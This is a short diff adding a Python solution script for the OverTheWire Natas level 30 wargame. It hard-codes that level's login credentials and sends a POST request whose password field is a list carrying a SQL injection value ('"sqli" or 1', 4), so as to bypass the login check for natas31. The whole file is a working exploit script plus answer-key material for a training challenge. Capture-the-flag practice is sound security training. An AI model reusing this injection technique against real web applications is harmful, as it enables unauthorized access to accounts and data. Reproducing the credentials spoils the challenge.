@@ -1,0 +1,10 @@
+natas30:Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X
+
+import requests
+
+url = 'http://natas30.natas.labs.overthewire.org'
+s = requests.Session()
+s.auth = ('natas30', 'Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X')
+
+r = s.post(url, data={'username': 'natas31', 'password': ['"sqli" or 1', 4]})
+print(r.text)
